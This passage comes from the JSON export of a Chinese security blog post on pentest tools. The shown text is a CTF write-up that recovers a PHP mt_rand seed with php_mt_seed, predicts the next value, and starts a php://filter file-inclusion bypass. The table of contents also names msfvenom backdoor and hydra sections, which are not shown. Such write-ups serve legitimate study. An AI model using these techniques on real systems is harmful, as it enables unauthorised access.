url<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"11-seed工具php-mt-seed\"><a href=\"#11-seed工具php-mt-seed\" class=\"headerlink\" title=\"11)seed工具php_mt_seed\"></a>11)seed工具php_mt_seed</h2><p>这里以一道题为例子讲解这个工具的使用</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;seed.php&quot;</span>);<br><span class=\"hljs-comment\">//mt_srand(*********);</span><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Hint: &quot;</span>.<span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;guess&#x27;</span>]) === <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-title function_ invoke__\">mt_rand</span>()))&#123;<br>    <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]) &amp;&amp; <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/NewStar/i&quot;</span>,<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]))&#123;<br>        <span class=\"hljs-comment\">//flag in `flag.php`</span><br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]);<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Baby Hacker?&quot;</span>;<br>    &#125;<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;No Hacker!&quot;</span>;<br>&#125; Hint: <span class=\"hljs-number\">1219893521</span><br>No Hacker!<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>搜索这两个函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-title function_ invoke__\">mt_scrand</span>()<br><span class=\"hljs-title function_ invoke__\">mt_rand</span>()  <br></code></pre></td></tr></table></figure>\n\n<p><code>mt_scrand(seed)</code>这个函数的意思，是通过分发<code>seed</code>种子，然后种子有了后，靠<code>mt_rand()</code>生成随机数。</p>\n<p>我们来写段代码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-title function_ invoke__\">mt_srand</span>(<span class=\"hljs-number\">12345</span>);    <br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-meta\">?&gt;</span>  <br></code></pre></td></tr></table></figure>\n\n<p>我们访问，输出<code>162946439</code>。</p>\n<p>现在代码改为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-title function_ invoke__\">mt_srand</span>(<span class=\"hljs-number\">12345</span>);    <br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br/&gt;&quot;</span>;<br><span class=\"hljs-meta\">?&gt;</span>    <br></code></pre></td></tr></table></figure>\n\n<p>我们再次访问:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>162946439</p>\n<p>247161732</p>\n<p>1463094264</p>\n<p>1878061366</p>\n<p>394962642</p></blockquote>\n<p>发现<code>162946439</code>又出现了</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>所以可以推断出随机数其实是可预测的，</p>\n<p>它以一种线性的方式生成</p>\n<p>知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>\n<p>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。 </p></blockquote>\n<p>在我们的例题中，我们并不知道我们的种子是多少</p>\n<p>但是它给出了我们种子的第一个随机数<code>1219893521</code></p>\n<p>这个时候想要拿到种子的值，就需要大量反向的演算推导了</p>\n<p>这个过程很庞大，所以这里就用到了工具【脚本】<code>php_mt_seed</code></p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-built_in\">time</span> ./php_mt_seed 第一个随机数  <br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20221120141340099.png\" alt=\"image-20221120141340099\"></p>\n<p>于是我们就得到了我们的<code>seed</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1145146</p></blockquote>\n<p>再分析源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Hint: &quot;</span>.<span class=\"hljs-title function_ invoke__\">mt_rand</span>().<span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;guess&#x27;</span>]) === <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-title function_ invoke__\">mt_rand</span>()))&#123;<br></code></pre></td></tr></table></figure>\n\n<p>这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较</p>\n<p>于是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br><span class=\"hljs-title function_ invoke__\">mt_srand</span>(<span class=\"hljs-string\">&quot;1145146&quot;</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>();<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;br&gt;&#x27;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">mt_rand</span>();<br><br>==&gt;<span class=\"hljs-number\">1219893521</span>&lt;br&gt;<span class=\"hljs-number\">1202031004</span><br></code></pre></td></tr></table></figure>\n\n<p>得到<code>guess</code>参数的值<code>1202031004</code></p>\n<p>对于最后对<code>file</code>文件包含语句的正则匹配绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]) &amp;&amp; <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/NewStar/i&quot;</span>,<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;file&#x27;</span>]))<br></code></pre></td></tr></table></figure>\n\n<p>大概就是不能出现<code>base</code>，然后参数中间要包含<code>/NewStar/</code>这一段</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs delphi\">?<span class=\"hljs-keyword\">file</span>=php:<span class=\"hljs-comment\">//filter</span><br></code></pre></td></tr></table></figure>\n\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"记性不好记录一下 常用工具的使用1）msf（1）msf基本使用一个漏洞利用框架,对计算机软件漏洞进行攻击 这里以vulnhub dc1为例 终端输入msfcon...","permalink":"/post/tooluse(Commontools)","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"10 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">常用工具的使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%EF%BC%89msf\"><span class=\"toc-text\">1）msf</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89msf%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">（1）msf基本使用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89msf%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\">（2）msf后门生成模块</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%99%AE%E9%80%9A%E7%94%9F%E6%88%90\"><span class=\"toc-text\">普通生成</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E7%94%9F%E6%88%90\"><span class=\"toc-text\">编码生成</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A5DC-3%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90\"><span class=\"toc-text\">*以DC-3举个例子</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#msf%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">msf利用木马</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#msfvenom-%E2%80%94list-archs\"><span class=\"toc-text\">msfvenom —list archs</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#msfvenom-%E2%80%94list-platforms\"><span class=\"toc-text\">msfvenom —list platforms</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%94%9F%E6%88%90%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">常见生成格式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1%E3%80%81-Windows\"><span class=\"toc-text\">1、 Windows</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2%E3%80%81Linux\"><span class=\"toc-text\">2、Linux</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3%E3%80%81Mac\"><span class=\"toc-text\">3、Mac</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4%E3%80%81Android\"><span class=\"toc-text\">4、Android</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5%E3%80%81Aspx\"><span class=\"toc-text\">5、Aspx</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6%E3%80%81JSP\"><span class=\"toc-text\">6、JSP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7%E3%80%81PHP\"><span class=\"toc-text\">7、PHP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8%E3%80%81BASH\"><span class=\"toc-text\">8、BASH</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9%E3%80%81Python\"><span class=\"toc-text\">9、Python</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Msfvenom%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0\"><span class=\"toc-text\">Msfvenom常用命令参数</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%EF%BC%89hydra\"><span class=\"toc-text\">2）hydra</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">1.爆破用户密码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3%EF%BC%89cewl\"><span class=\"toc-text\">3）cewl</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%EF%BC%89wpscan\"><span class=\"toc-text\">4）wpscan</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5%EF%BC%89John\"><span class=\"toc-text\">5）John</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6%EF%BC%89weevely\"><span class=\"toc-text\">6）weevely</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7%EF%BC%89whatweb\"><span class=\"toc-text\">7）whatweb</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8%EF%BC%89knockd\"><span class=\"toc-text\">8）knockd</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-knock%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">1&gt; knock命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-nc%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2&gt;nc命令</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-openssl\"><span class=\"toc-text\">9)openssl</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSL-%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">SSL 简介</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-gobuster\"><span class=\"toc-text\">10)gobuster</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">爆破目录</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4%E5%AD%90%E5%9F%9F%E5%90%8D\"><span class=\"toc-text\">爆破子域名</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-seed%E5%B7%A5%E5%85%B7php-mt-seed\"><span class=\"toc-text\">11)seed工具php_mt_seed</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Burpsuite密码爆破","uid":"463054968cf55cbdec365eb1472bde0e","slug":"tooluse(bp-bruce)","date":"2023-02-13T13:43:45.284Z","updated":"2023-08-06T08:00:41.147Z","comments":true,"path":"api/articles/tooluse(bp-bruce).json","keywords":null,"cover":"/img/26.jpg","text":"顺便记一下，免得后面到处翻 Burpsuite密码爆破虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间，这个网站提供了很全面的密码表 http...","permalink":"/post/tooluse(bp-bruce)","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"golang","uid":"54d4e8482c6dc0ae7c398e63273488f8","slug":"Go","date":"2022-12-23T13:16:34.183Z","updated":"2023-09-06T12:29:46.996Z","comments":true,"path":"api/articles/Go.json","keywords":null,"cover":"/img/7.jpg","text":"主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记https://www.xiexianbin.cn/golang 以及https://exercism.org...","permalink":"/post/Go","photos":[],"count_time":{"symbolsCount":"6k","symbolsTime":"5 mins."},"categories":[{"name":"语言学习","slug":"语言学习","count":1,"path":"api/categories/语言学习.json"}],"tags":[{"name":"go语言","slug":"go语言","count":2,"path":"api/tags/go语言.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}